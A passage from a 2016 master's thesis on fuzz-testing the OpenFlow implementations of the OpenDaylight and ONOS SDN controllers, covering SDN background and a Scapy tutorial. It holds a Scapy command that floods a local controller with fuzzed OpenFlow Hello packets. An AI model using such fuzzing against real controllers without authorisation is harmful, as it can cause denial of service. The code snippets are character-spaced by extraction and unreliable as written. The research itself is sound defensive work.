=== Content from aaltodoc.aalto.fi_9024b6cb_20250124_150338.html ===
Security Testing SDN Controllers

Andi Bidaj

School of Science

Thesis submitted for examination for the degree of Master of
Science in Technology.
Espoo 30.06.2016

Thesis supervisors:

Prof. Tuomas Aura, Aalto University

Prof. Lillian Røstad, NTNU Norwegian University of Science
and Technology

aalto university
school of science

Author: Andi Bidaj

Title: Security Testing SDN Controllers

abstract of the
master’s thesis

Date: 30.06.2016

Language: English

Number of pages: 6+61

Department of Computer Science

Professorship: Security and Mobile Computing T-110

Supervisors: Prof. Tuomas Aura, Prof. Lillian Røstad

Software-deﬁned networking is a new paradigm that separates the network’s control
plane from the data plane. Many SDN controllers have been implemented since this
concept was ﬁrst introduced. As with other network models, security becomes an
important requirement because adversaries can launch various attacks to steal sen-
sitive data, manipulate network’s state or cause denial of service to legitimate users.

In this work, we apply fuzzing techniques to discover vulnerabilities in implemen-
tation of the OpenFlow protocol in SDN controllers such as OpenDaylight and
ONOS. Careful planning and understanding of the system is crucial to improve
testing eﬃciency. Threat modeling is an approach to identify and analyze risks
and threats in the system under test. The list of threats is ﬁrst constructed ap-
plying the STRIDE methodology and extended using CAPEC Mitre attack libraries.

Testing revealed a considerable number of denial of service vulnerabilities and
other bugs. An exploit of few lines of code written using scapy managed to crash
the controller. Another important denial of service attack blocked legitimate
applications to add ﬂows to particular switches until the OpenDaylight controller
is restarted. Moreover, fuzzing revealed several less important bugs, which aﬀected
both the OpenDaylight and ONOS controllers.

Testing presented a number of challenges. Measuring and improving test coverage
poses a signiﬁcant issue. Increasing the number of test case scenarios could help
covering larger parts of the software.

Keywords: SDN, fuzzing, OpenDaylight, ONOS, OpenFlow

iii

Acknowledgements

I would like to thank everyone who has been with me during this long journey, which
is now coming to the end. Your support has been very precious to me.

I am grateful to my family who encouraged me since from the beginning of this

adventure. I cannot wait to see my sister at the graduation ceremony.

Thank you to all my friends who have been closed to me in the most diﬃcult

moments. Your messages have always inspired me to go ahead.
I can’t forget Professor Lillian Røstad for her remote help.
My special thanks go to Professor Tuomas Aura for his good and continuous
guidance. His advices have always been so valuable to me. I learned a lot and I grew
up tremendously both personally and professionally.

This work was supported by TEKES as part of the Cyber Trust program of
DIGILE (the Finnish Strategic Center for Science, Technology and Innovation in the
ﬁeld of ICT and digital business).

Once more, thank you to all of you.

Otaniemi, 30.06.2016

Andi Bidaj

Contents

Abstract

Acknowledgements

Contents

Symbols and abbreviations

1 Introduction

1.1 Motivation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
1.2 Research Goals
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
1.3 Thesis Outline . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .

2 Background on Software-Deﬁned Networking

2.1 Software-Deﬁned Networking . . . . . . . . . . . . . . . . . . . . . . .
2.2 OpenFlow . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
2.2.1 OpenFlow Speciﬁcation . . . . . . . . . . . . . . . . . . . . .
2.3 SDN Controllers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
2.3.1 OpenDaylight . . . . . . . . . . . . . . . . . . . . . . . . . . .
2.3.2 ONOS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .

iv

ii

iii

iv

vi

1
1
1
2

3
3
4
5
8
8
9

3 Background on Security Testing

10
3.1 Security Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
3.2 Fuzzing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14
3.3 Testing Tools
Scapy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14
3.3.1
3.3.2
Spike . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16
3.3.3 Radamsa . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
3.3.4 ProxyFuzz . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18

4 Test Case Design

19
4.1 Understand The System . . . . . . . . . . . . . . . . . . . . . . . . . 19
4.2
Identify Threats . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
4.3 Risk Management . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26

5 Test Implementation

28
5.1 Choosing The Right Fuzzer
. . . . . . . . . . . . . . . . . . . . . . . 28
5.2 Test Environment . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
Implement The Test Strategy . . . . . . . . . . . . . . . . . . . . . . 32
5.3

6 Results

38
6.1 Fuzzing Oracles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38
. . . . . . . . . . . . . . . . . . . . . . . . 39
6.2 Discovered Vulnerabilities

v

7 Discussion

49
7.1 Summary Of The Discovered Vulnerabilities
. . . . . . . . . . . . . . 49
7.2 Test Coverage . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 50

8 Conclusion

References

52

58

Symbols and abbreviations

vi

Software-deﬁned Networking
OpenDaylight
Open Network Operating System
System Under Test
Not Available
Denial of Service
Operating System
Simple Network Management Protocol
Application Program Interface
Structured Query Language
Cross-site Scripting
National Institute of Standards and Technology
Internet Protocol
Transmission Control Protocol
Representational State Transfer
Address Resolution Protocol

Abbreviations
SDN
ODL
ONOS
SUT
NA
DOS
OS
SNMP
API
SQL
XSS
NIST
IP
TCP
REST
ARP
CAPEC Common Attack Pattern Enumeration and Classiﬁcation
CIA
GUI
XML
ID
CPU
MC/DC Modiﬁed Condition/Decision Coverage
Virtual Local Area Network
VLAN
Transport Layer Security
TLS

Conﬁdentiality, Integrity and Availability
Graphical User Interface
Extensible Markup Language
Identiﬁer
Central Processing Unit

1

1

Introduction

1.1 Motivation

The continuous increase of the number of mobile users, cloud services and server
virtualization technologies creates the need for new network architectures. In order
to meet the requirements of the today’s networks, it has been proposed [1] a new
concept called Software Deﬁned Networking (SDN). The SDN architecture decouples
the control and data plane of the network, thus oﬀering a directly programmable and
centralized network logic and state. The control plane is represented by the controller,
while an SDN switch is entirely responsible for the data plane. Northbound and
southbound API are two key concepts of the SDN architecture. On top of the control
plane, it is possible to build business applications using the northbound API. This
interface is not standardized and it depends on the implementation of the speciﬁc
SDN controller. In contrast, the southbound API is well deﬁned for example, by
the OpenFlow protocol, which enables the communication between controllers and
switches. Details and characteristics of SDN networks have been previously described
in many research works [1] [2] [3] [4] [5] [6] [7].

As with any other network protocols, security becomes an important issue. Ma-
licious users can attack both controllers and switches resulting in denial of service
for legitimate users, theft of sensitive information and ﬁnancial loss for the com-
pany operating the network. While progress has been made to test software and
ﬁx vulnerabilities, more bugs are introduced as software become more complex. It
is thus important to apply eﬃcient and automated testing techniques to discover
vulnerabilities with minimal eﬀort. In the context of this thesis, we will apply several
fuzzing methods to reveal bugs in SDN controllers.

Fuzzing is a testing technique used by sending illegal or unexpected input to the
software and monitoring for exceptions and unexpected behavior. Fuzz testing is
usually a brute-force technique, but it is simple and eﬀective. Fuzzers are available
for testing a large range of vulnerabilities such as buﬀer overﬂows, SQL injections,
denial of service attacks and format bugs. While these vulnerabilities can be found
in web applications or ﬁle formats, in this work we will test the implementation of a
network protocol, more speciﬁcally of OpenFlow[8].

Security of SDN networks and its elements including OpenFlow, has been the
subject of many research works. Kreutz et al. [9] analyze attack vectors and sketch
the design of a secure and dependable SDN control platform. Scott-Hayward et
al. [10] provide a comprehensive survey regarding the security of software-deﬁned
networks. Other studies [11][12] focus on discovering potential vulnerabilities related
to controllers, switches and communication channels between them. [11] is the closest
research to our work. However, they do not use fuzz testing.

1.2 Research Goals

The goal of this thesis is to apply open-source fuzzers to test network elements
that are running in virtual machines. The initial testing target will be diﬀerent

2

implementations of the software-deﬁned networking (SDN) controllers. The focus is
on fuzz testing, which makes random mutations to previously recorded test cases or
ones from model-based testing. It is also possible to consider other testing methods
that aim to ﬁnd previously unknown vulnerabilities. Some of the questions we will
answer in this thesis are:

1. Which fuzzers are suitable to test network protocols?

2. What are the main threats against SDN controllers?

3. How can we test the OpenDaylight and ONOS controllers for security vulnera-

bilities that can be exploited by a malicious switch?

4. What type of vulnerabilities can be detected in a network protocol with fuzz

testing?

5. How can we improve testing and increase test coverage?

1.3 Thesis Outline

The thesis is structured as follows. Chapter 2 gives an overview of SDN and OpenFlow,
while chapter 3 describes the main fuzzing techniques and security tools used in this
thesis. Chapter 4 introduces to the test case design, based on threat modeling process.
Chapter 5 continues with the testing implementation, while the found vulnerabilities
are analyzed in chapter 6. In section 7, we discuss about test coverage and other
issues related to planning and implementation of fuzz testing. A short summary of
this thesis is presented in chapter 8.

3

2 Background on Software-Deﬁned Networking

In this chapter, we provide a general description of SDN and give an overview of the
OpenFlow protocol which is relevant in understanding the communication between a
legitimate controller and a malicious switch.

2.1 Software-Deﬁned Networking

Software-deﬁned networking (SDN) [5] is an emerging network paradigm that sepa-
rates the network’s control logic from the underlying data plane. SDN transforms
the role of the switches into simple forwarding devices and moves the control logic
into a central component called controller or network operating system. In contrast
to the traditional network architectures, the separation of roles in an SDN network
is the key to achieving ﬂexibility and to making it easier to introduce new concepts
in networking. Moreover, network management is simpliﬁed, thus motivating and
pushing network evolution and innovation.

According to [5], there are four pillars that deﬁne the SDN network architecture:

1. The control plane is decoupled from the data plane as described above.

2. Packet forwarding is made based on ﬂows in contrast to the decision based
forwarding in the traditional networks. According to [8], a ﬂow entry consists
of match ﬁelds, counters, and a set of instructions to apply to matching packets.
A match can be on any packet ﬁeld value.

3. The SDN controller is responsible for the centralized control logic. Current
well-known SDN controllers include OpenDaylight1, ONOS2, Floodlight3 and
POX4.

4. SDN networks are programmable. Thus, it is possible to develop software

through an interface to manage data plane.

The SDN architecture is composed of diﬀerent layers as shown in Figure 1. We

provide a short overview of the SDN elements[5].

1. Forwarding Device:

It is an SDN Switch, which receives packets from the
network and forwards them as instructed by the controller. The instruction
sets are ﬂow rules which usually drop or forward the packets to the controller
or to any other port.

2. Data plane:

It is composed of the infrastructure required to interconnect

together the SDN switches.

1https://www.opendaylight.org/
2http://onosproject.org/
3http://www.projectﬂoodlight.org/ﬂoodlight/
4https://openﬂow.stanford.edu/display/ONL/POX+Wiki

4

Figure 1: SDN Architecture

3. Southbound Interface:

It deﬁnes the communication protocol between SDN

controllers and switches.

4. Control Plane:

It comprises elements, such as applications or controllers,

responsible for the control logic.

5. Northbound Interface:

It wraps the instruction sets of the Southbound Interface
into APIs. Developers can implement software and program the network using
this interface.

6. Application Plane:

It comprises the set of applications built on top of the
Northbound Interface. Such applications can, for example, implement ﬁrewalls,
routing policies or load balancers.

2.2 OpenFlow

OpenFlow [1] is a popular and widely-deployed Software-Deﬁned Networking tech-
nology. OpenFlow diﬀers from SDN in the way that the latter decouples the control
and data plane, while OpenFlow standardizes the interface between the controller
and the forwarding devices. McKeown et al. [1] exploit common features in the ﬂow
tables of the Ethernet switches in order to programmatically control the switches and
implement new routing protocols, new security models and possible alternatives to IP.
According to [2], the OpenFlow architecture is composed of an OpenFlow-compliant

5

switch, a controller and a secure channel between them. The controller receives and
sends the packets from and to the switch and controls the rules in the ﬂow tables.
The switch follows the rules and applies a set of actions to each ﬂow. The switch type,
which can be a dedicated or an OpenFlow-enabled switch, determines the diﬀerent
kinds of actions. The OpenFlow-enabled switch extends the dedicated version by
supporting both OpenFlow and traditional forwarding. The two types of switches
must support three basic actions associated to the ﬂow-entries.

1. Forward packets to the correct next-hop device.

2. Forward packets to the controller through the secure channel, typically when

the switch does not know how to handle the packets.

3. Drop the ﬂow’s packets, for example for security reasons.

The extended switch type should support the forwarding from the OpenFlow
datapath to the normal processing line. This can be achieved either by adding a
new action or by tagging the packets with a diﬀerent VLAN ID, which separates the
OpenFlow datapath and the normal processing line as diﬀerent vitual networks.

2.2.1 OpenFlow Speciﬁcation

The secure channel connects an SDN controller with one or more switches. The
interface between the controller and the switch is deﬁned by the OpenFlow protocol
(In this thesis, we refer to the version 1.3.4 as speciﬁed in [8]). In this section, we
provide a short overview of the most important concepts including a short description
of each packet type. There are in total thirty diﬀerent kinds of messages which
are classiﬁed as symmetric, asynchronous and controller-to-switch messages. The
message structure starts with the header and may include other values, structures,
enumerations or bitmasks. The header structure is shown in Figure 2:

Figure 2: OpenFlow packet header

The OFPT_constant indicates the message type and can be one of the following:

1. OFPT_HELLO: The controller or the switch sends a Hello packet during
connection setup to agree on the highest version of OpenFlow supported. The
connection can be started either from the switch or from the controller.

6

2. OFPT_ERROR: The controller or the switch sends this message to indicate a
failure during normal functioning. The error is described by the message type
and code and an eventual description. The complete list of error codes can be
found at [8].

3. OFPT_ECHO_REQUEST: The controller or the switch sends an Echo Request
packet to check whether the receiver is still connected or to ask any information
about latency or bandwidth.

4. OFPT_ECHO_REPLY: The entity receiving an Echo Request replies back

with an Echo Reply that has the same body as the request.

5. OFPT_EXPERIMENTER: The role of this packet is not included in the

speciﬁcation but is vendor-deﬁned.

6. OFPT_FEATURE_REQUEST: After exchanging the Hello Packets and es-
tablishing the highest version of OpenFlow supported by both parties, the
controller sends a Feature Request to the switch to retrieve the number of
buﬀers, datapath ID or other capabilities.

7. OFPT_FEATURE_REPLY: In response to a Feature Request, the switch
sends a Feature Reply indicating the capabilities it has. The datapath ID
uniquely identiﬁes the packet processing pipeline.

8. OFPT_GET_CONFIG_REQUEST: The controller queries the switch the IP
packet fragmenting conﬁguration and maximum number of bytes in a packet
that the datapath should send to the controller

9. OFPT_GET_CONFIG_REPLY: The switch replies to a Get Conﬁg Request
with a Get Conﬁg Reply indicating whether the IP fragments should be treated
In addition, the message includes the
normally, dropped, or reassembled.
number of bytes in a packet that can be sent to the controller through the
datapath.

10. OFPT_SET_CONFIG: The controller can set the IP packet fragmenting

conﬁguration. The switch does not reply to this message.

11. OFPT_PACKET_IN: The switch can send to its controller a received packet
in a Packet In message if directed by the action set or due to table miss or
TTL error.

12. OFPT_FLOW_REMOVED: If a ﬂow in the table is removed, the switch sends
a Flow Removed message to the controller. A ﬂow can be removed due to idle
timeout, hard timeout or deletion. The idle timeout occurs when no packets
are matched during the speciﬁed time. The hard timeout occurs after a certain
time, independently from the number of packets matched.

13. OFPT_PORT_STATUS: The switch informs the controller about any status

change on a speciﬁc port using a Port Status message.

7

14. OFPT_PACKET_OUT: This message is used when the controller wants to

send a packet to the switch datapath.

15. OFPT_FLOW_MOD: The controller sends this message to manipulate ﬂow

tables in the switch. It is one of the most important messages.

16. OFPT_GROUP_MOD: The controller sends this message to manipulate group

tables in the switch.

17. OFPT_PORT_MOD: The controller sends this message to manipulate the

state of an OpenFlow port.

18. OFPT_TABLE_MOD: The controller sends a request to conﬁgure or modify
the behavior of a ﬂow table. This message is deprecated in this version 1.3.4
but it is kept for backward compatibility with earlier versions.

19. OFPT_MULTIPART_REQUEST: The controller can retrieve a large amount
of data from the switch using a Multipart Request. The body of the packet is
interpreted based on the type of the message, which can be: OFPMP_DESC,
OFPMP_FLOW, OFPMP_AGGREGATE, OFPMP_TABLE,
OFPMP_PORT_STATS, OFPMP_QUEUE, OFPMP_GROUP,
OFPMP_GROUP_DESC, OFPMP_GROUP_FEATURES,
OFPMP_METER, OFPMP_METER_CONFIG,
OFPMP_METER_FEATURES, OFPMP_TABLE_FEATURES,
OFPMP_PORT_DESC, OFPMP_EXPERIMENTER. The OpenFlow speci-
ﬁcation [8] describes multipart requests in detail.

20. OFPT_MULTIPART_REPLY: After receiving a Multipart Request, the switch
sends the requested information to the controller in one or more Multipart
Reply messages.

21. OFPT_BARRIER_REQUEST: A Barrier Request message serves as a syn-
chronization point. The controller wants to make sure that the messages are
executed in a speciﬁc order by the switch.

22. OFPT_BARRIER_REPLY: The switch must process all the previously re-

ceived requests before sending a Barrier Reply to the controller.

23. OFPT_QUEUE_GET_CONFIG_REQUEST: The controller queries informa-

tion from the switch about the port queue conﬁguration.

24. OFPT_QUEUE_GET_CONFIG_REPLY: The switch replies to the controller

with the information regarding the port queue conﬁguration.

25. OFPT_ROLE_REQUEST: The controller can change or request its role from
the switch. When there are multiple controllers connected to the same switch,
one controller is selected as a master, while the others become slaves.

8

26. OFPT_ROLE_REPLY: Upon receiving a Role Request from the controller,

the switch replies back indicating the current role of the controller.

27. OFPT_GET_ASYNC_REQUEST: The controller can query which asyn-
chronous messages can receive from the switch. The asynchronous messages can
be one of the following: OFPT_PACKET_IN, OFPT_FLOW_REMOVED,
OFPT_PORT_STATUS and OFPT_ERROR.

28. OFPT_GET_ASYNC_REPLY: After receiving a Get Async Request from
the controller, the switch replies back indicating the asynchronous messages
which it can be sent to the controller.

29. OFPT_SET_ASYNC: The controller sets which asynchronous messages it can

receive from the switch.

30. OFPT_METER_MOD: The controller sends this message to add, modify or

delete a meter in the switch.

2.3 SDN Controllers

The number of SDN controllers has grown exponentially since the advent of the
ﬁrst network operating system NOX[13]. At the moment of writing, the list of
most popular controllers comprises POX5, Floodlight6, OpenDaylight7 or ONOS[14].
Among characteristics that make one SDN controller diﬀer from the rest we can
mention architecture, ease of use or implementation language. In this thesis, we
conduct security testing on OpenDaylight and ONOS controllers.

2.3.1 OpenDaylight

The OpenDaylight (ODL) controller is JVM software that implements SDN concepts[15].
ODL oﬀers support for a range of protocols including OpenFlow, NETCONF and
BGP/PCEP[16]. We focus on the implementation of the OpenFlow protocol. Several
software versions have been published during our research; our study considers only
OpenDaylight Lithium-SR3 and Beryllium[17]. Both these versions make use of the
following tools[15]:

• Maven: Maven makes it easier to automate building and installation.

• OSGi: OSGi serves as the back-end of OpenDaylight and allows to load and

bind together bundles and packages into JAR ﬁles.

• JAVA interfaces: Useful for event listening, speciﬁcations, and forming pat-

terns.

5http://www.noxrepo.org/pox/about-pox/
6http://www.projectﬂoodlight.org/ﬂoodlight/
7https://www.opendaylight.org/

9

• REST APIs: Northbound APIs used for ﬂow programming, static routing and

so on.

OpenDaylight can be downloaded as a pre-built image from [17] or build from
scratch using Maven. For simplicity and reproducibility of results, we download and
run the pre-built version. In addition, we proceed installing several required features
with the following command:

o p e n d a y l i g h t −user@root >f e a t u r e : i n s t a l l
odl−r e s t c o n f −a l l odl−dlux−a l l odl−l 2 s w i t c h −s w i t c h

These features enable respectively REST APIs, the web server interface and the

OpenFlow protocol.

2.3.2 ONOS

ONOS (Open Network Operating System) is a distributed but logically centralized
network operating system[14]. The purpose of this project is to build an open-source
network operating system which provides high-availability, scale-out and performance
for Service Provider networks[18]. A powerful feature of ONOS is the ability to run
as a cluster of servers. Network operators can add or remove such servers according
to their needs, thus allowing scalability.

Similarly to OpenDaylight, ONOS architecture is written in Java, built using
Maven, supports NETCONF and OpenFlow as the southbound API, and exposes
REST APIs as the northbound abstraction.

10

3 Background on Security Testing

In this section, we introduce two security testing approaches and continue explaining
the concept of fuzzing and its main techniques. We introduce the main fuzzing tools
used in this work and describe the advantages and disadvantages of choosing each
fuzzer.

3.1 Security Testing

The increasing number of interconnected computer systems and electronic devices
has become a popular target for diﬀerent attackers, who launch more and more
sophisticated attacks. According to [19], these attacks fall under two main categories:
passive and active attacks. The passive ones can be eavesdropping or traﬃc analysis,
while the active attacks usually modify or create a false stream of data and can be
of one of the following types: masquerade, replay, modiﬁcation of messages or denial
of service. A short description of the attacks is included in table 1.

Eavesdropping

Traﬃc Analysis

Passive Attacks

Attacker monitors the connection
and observes the transmitted information
Attacker extracts traﬃc patterns
or any useful information such as location or
participants’ identities by monitoring the traﬃc
Active Attacks

Masquerade
Replay

Modiﬁcation of Messages

Denial of Service

Attacker pretends to be another entity
The attacker captures and retransmits the messages
Attacker alters, deletes or
reorders portions of the original message
Attacker makes the resource unavailable
to the legitimate user

Table 1: Attack list

Several security services and mechanisms can be implemented to make the system
more secure but such measures go beyond the goal of this work. We focus on security
testing, which is important to test that the security requirements have been correctly
deployed. With security testing, the tester discovers vulnerabilities that could lead
to harmful attacks like the ones listed above.

There are several approaches to the security testing. In this section, we discuss
two of them. The ﬁrst one derives from Guideline on Network Security published
by the National Institute of Standards and Technology NIST [20]. According to
the guideline, security testing should be conducted at various phases of system
development life cycle. It is common that the system security is evaluated after the
implementation and installation and after operational and maintenance. During
implementation phase, testing can be conducted at component or system level. The

11

scope of the testing addresses several areas such as computer security, communication
security, physical security or personnel security. Once the system is operational,
it is important to ensure that the system is working as speciﬁed in the security
requirements. Depending on the importance of system, testing during operational
stage should be conducted frequently. Systems, such as ﬁrewalls or web servers,
should be assigned a higher priority and higher testing frequency. Several stakeholders
must participate in the testing process ranging from network administrators and
managers to the Chief Information Oﬃcer and Information Systems Security Oﬃcers.
The Guideline [20] proposes a list of techniques to use when doing network testing,
but we describe a subset of them which are relevant to this work. We outline the
following types of testing:

1. Network scanning:

It involves running a port scanner to ﬁnd the active hosts,
open ports and running services in the network devices. Some scanners, such
as nmap8, will try to guess the operating system running in the device and this
process is commonly called operating system ﬁngerprinting. Network scanning is
fundamental to ﬁnd the host running the software-deﬁned networking controller.

2. Vulnerability scanning: A vulnerability scanner, like a network scanner, iden-
tiﬁes the active hosts and open ports, but in addition, provides information
about existing vulnerabilities in the system. A vulnerability scanner possesses
a large database of known vulnerabilities and matches the gathered informa-
tion from the host with the database information. For example, a particular
software version might indicate the vulnerabilities associated with that version.
Vulnerability scanners are fast and easy to identify known vulnerabilities. The
main weakness is that if a vulnerability is not known and saved in the database,
a vulnerability scanner cannot detect it.

3. Penetration testing: The next step after identifying vulnerabilities is to exploit
them in order to gain access to the system. It is a labour-intensive and diﬃcult
process, which requires careful planning and execution.

A second methodology to security testing follows a risk-based approach [21][22].
Authors suggest to create tests driven by the risks identiﬁed in a system. Testing
the areas that are more likely to be attacked will increase the chances to make the
software more secure. Security testers should perform several tasks at each stage of
software development life-cycle, which is a signiﬁcant diﬀerence compared to the ﬁrst
approach in the previous paragraph. While in the Guideline on Network Security
[20] testing is done after the implementation and operations phases, the methodology
in [21] comprises activities during the requirements and design stages. The full list
of tasks is shown in Figure 3 and comprises:

• Creating security abuse and misuse cases

• Listing normative security requirements

8https://nmap.org

12

• Performing architectural risk analysis

• Building risk-based security test plans

• Wielding static analysis tools in a non-runtime environment

• Performing security tests in the running system manually

• Penetration testing in the ﬁnal environment

• Cleaning up after security breaches

Figure 3: The software development life cycle[21]

3.2 Fuzzing

In this section, we describe a variety of approaches how to discover security vulnera-
bilities, each of them with its pros and cons. The most important approaches are:
white box, black box and grey box testing. The main diﬀerence depends on how
much information the attacker has about the system. During white box testing, the
attacker has full access to the source code, system design and architecture, while black
box testing requires no information about the internals and design of the systems.
Grey box testing sits in the middle of these two approaches, and the attacker might
have access to some documentation or to the system states.

Nowadays, according to [23], hackers may either inspect the code using a disas-
sembler or use fuzzing to search for vulnerabilities. Fuzzing is a well-known black
box technique useful to discover faults in software by providing unexpected input
and monitoring abnormal output. Typically an attacker or tester manipulates the
valid input in order to trigger undeﬁned behavior. Fuzzers are generally divided into
two main categories: mutation-based and generation-based. Typically, the mutation-
based fuzzers mutate the existing data to create test cases, while generation-based
ones use the protocol model to create test cases. There is no standard procedure for
how to apply fuzzing techniques, but generally the following steps might be valid
very often[24]:

13

1. Identify target: The target might be a system the attacker is hired to test,
a recently developed system or any commonly used software with potential
vulnerabilities.

2. Identify inputs:

It is crucial to understand the attack surface so that any input
to the software can be carefully crafted with unacceptable values. Some of the
inputs might be trivial to locate, but others might be less obvious.

3. Generate fuzzed data:

Input vectors can be generated either by mutating

existing data or depending on the target type and data format.

4. Execute fuzzed data: When testing a network protocol, fuzzed data should be

sent as packets to the target.

5. Monitor for exceptions: After executing fuzzed data, the security tester should
monitor any exceptional behavior such as server crashing, increased resource
consumption or illegal application state. The available monitoring methods
depend on the type of application and system under test.

6. Determine exploitability: Security testers should go beyond causing exceptions

to analyze and possibly exploit the found vulnerabilities.

In order to make the fuzzing tests more eﬀective, it is crucial to correctly generate

the fuzzing data. Sutton et al. [24] propose a list of ﬁve fuzzing categories:

1. Pregenerated test cases: Protocol ﬁelds or packets are hardcoded to test
boundary conditions. Tests are derived from the protocol speciﬁcation. This
method lacks ﬂexibility because it comprises no random component.

2. Random: Protocol ﬁelds contain random or pseudo-random values. This
method is the least eﬀective because many test cases fall under the same
domain input.

3. Manual protocol mutation testing: The security tester enters protocol ﬁeld
values manually. This method is considered as slow and poorly eﬀective.

4. Mutation or brute force testing: The fuzzer makes an eﬀort to produce all the
possible combinations of the data packet ﬁelds. This method requires a lot of
time as the number of tests is quite large.

5. Automatic protocol generation testing: The security tester needs to model the

protocol speciﬁcation, which is used to derive the test cases.

Even though fuzzing is a powerful black box testing method, it poses limitations in
discovering several type of vulnerabilities. Typically, fuzzers fail to ﬁnd ﬂaws related
to access control, poor design logic, backdoors, memory corruption or multistage
vulnerabilities[24].

14

3.3 Testing Tools

Security testers have developed a large number of tools to increase productivity and
eﬃciency in discovering vulnerabilities. The security tester or the attacker chooses a
target, which is usually called System Under Test (SUT). The process of testing the
implementation of a network protocol in the SUT, comprises a large range of testing
methods. We focus on fuzz testing and in this section, we give an overview of the
main fuzzers used in this work.

3.3.1 Scapy

Scapy[25] is a Python program used to send, receive, sniﬀ and forge packets. Scapy
is a powerful tool to decode many protocols, manipulate the packets, send them to
the network and receive the answers. There are several advantages for using Scapy
compared to other networking tools. Creating a raw packet using Scapy might require
a few lines of code, much less than doing the equivalent task in C. In addition,
Scapy matches the responses and returns two lists, with matched and the other with
unmatched packets. While many security tools focus on particular functionality such
as ARP poisoning, Scapy can be used to perform port scanning or fuzzing very easily
just by creating speciﬁc raw packets.

Before describing how to design packets, we provide a short installation guide for
Ubuntu like operating systems. This part is written in tutorial style so that the reader
can easily repeat the process. In this thesis, we use Scapy 2.2.0-dev with additional
dissectors to decode OpenFlow protocol. Python2.x version is a prerequisite before
installing Scapy.

1. Install the Mercurial version control system. In Ubuntu use:

$ sudo apt−g e t

i n s t a l l m e r c u r i a l

2. Clone Scapy-openﬂow repository. Note that the oﬃcial Scapy repository does

not contain the decoders for OpenFlow.

$ hg c l o n e h t t p s : / / b i t b u c k e t . o rg /mtury/ scapy−o p e n f l o w

3. Install Scapy using root privileges.

$ cd scapy−o p e n f l o w
$ sudo python s e t u p . py i n s t a l l

4. In order to update to the latest version, run the following commands:

$ hg p u l l
$ hg update
$ sudo python s e t u p . py i n s t a l l

5. After the installation has completed, run the program:

$ sudo scapy

Scapy is normally run in an interactive Python shell, but its functions can

alternatively be imported in Python scripts using:

from scapy . a l l

import ∗

Now that we ran the program, we can create packets very easily:

15

>>> p a c k e t = Ether ( ) / IP ( ) /TCP( s p o r t =6653)
>>> p a c k e t
<Ether
s p o r t =6653 |>>>

type=0x800 |<IP

f r a g =0 p r o t o=tc p |<TCP

We created a TCP packet with the source port equal to 6653 and all the other
parameters were left unchanged and set to default by Scapy. The operator ’/’ is used
to concatenate diﬀerent protocol layers. In our packet, we added TCP on top of IP
on top of Ethernet. The created packet is subsequently printed in the shell. Other
important functions are:

20 00 77 93 00 00

( 0 ) . Assuming d a t a o f s =5

00 00 00 00 08 00 45 00

00 00 00 00 00 00 50 02

00 28 00 01 00 00 40 06

00 01 19 FD 00 50 00 00

7C CD 7F 00 00 01 7F 00

FF FF FF FF FF FF 00 00

>>> hexdump ( p a c k e t )
0000
. . . . . . . . . . . . . . E .
0010
. ( . . . . @ . | . . . . . . .
0020
. . . . . P . . . . . . . . P .
0030
>>> p = s t r ( p a c k e t )
>>> TCP( p )
WARNING: bad d a t a o f s
<TCP s p o r t =65535 dport =65535 s e q =4294901760 ack=0
d a t a o f s =0L r e s e r v e d =8L f l a g s= window=17664 chksum=0x28
u r g p t r=1 o p t i o n s = [ ]
|<Raw l o a d =’\ x00 \x00@\ x06 | \ xcd \ x 7 f
\ x00 \ x00 \ x01 \ x 7 f \ x00 \ x00 \ x01 \ x19 \ xf d \x00P\ x00 \ x00 \ x00
\ x00 \ x00 \ x00 \ x00 \x00P\ x02 \x00w\ x93 \ x00 \x00 ’
>>> send ( p a c k e t )
WARNING: Mac a d d r e s s
Using b r o a d c a s t .
.
Sent 1 p a c k e t s .
>>> o p e n f l o w = s n i f f ( f i l t e r =" t cp and p o r t 6 6 5 3 " , count =2)
>>> o p e n f l o w [ 0 ]
<Ether
type=0x800 | <IP
i d =53939 f l a g s=DF f r a g =0L t t l =64 p r o t o=tc p chksum=0x 6 9 f 6
s r c = 1 2 7 . 0 . 0 . 1 d s t = 1 2 7 . 0 . 0 . 1 o p t i o n s = [ ]
dport =6653 s e q =1981674888 ack=0 d a t a o f s =10L r e s e r v e d =0L
f l a g s=S window=43690 chksum=0x f e 3 0 u r g p t r=0 o p t i o n s=

d s t = 0 0 : 0 0 : 0 0 : 0 0 : 0 0 : 0 0 s r c = 0 0 : 0 0 : 0 0 : 0 0 : 0 0 : 0 0
v e r s i o n =4L i h l =5L t o s =0x10 l e n =60

t o r e a c h d e s t i n a t i o n not found .

|<TCP s p o r t =50972

|>>

[ ( ’ MSS’ , 6 5 4 9 5 ) ,
( 4 6 8 7 9 5 , 0 ) ) ,

( ’ SAckOK ’ ,

( ’NOP’ , None ) ,

16

( ’ Timestamp ’ ,

’ ’ ) ,
( ’ WScale ’ , 7 ) ]

|>>>

The command to load the OpenFlow 1.3 dissector, is:

>>> l o a d _ c o n t r i b ( ’ openflow3 ’ )

In the following command, it is possible to fuzz the OpenFlow Hello packet

maintaining the packet type as constant 0:

>>> send ( IP ( d s t = " 1 2 7 . 0 . 0 . 1 " ) /TCP( dport =6653)/
f u z z ( OFPTHello ( type =0)) , l o o p =1000)

Due to its ﬂexibility and its architecture, Scapy is a powerful tool for creating

packets from scratch and performing a variety of tests on network functionalities.

3.3.2 Spike

Spike[26] is a ﬂexible fuzzer framework written in C. Spike is a C library and exposes
APIs that can be used to write powerful fuzzers depending on the protocol that needs
to be tested. Many protocols have similar structure and data, thus it is possible to
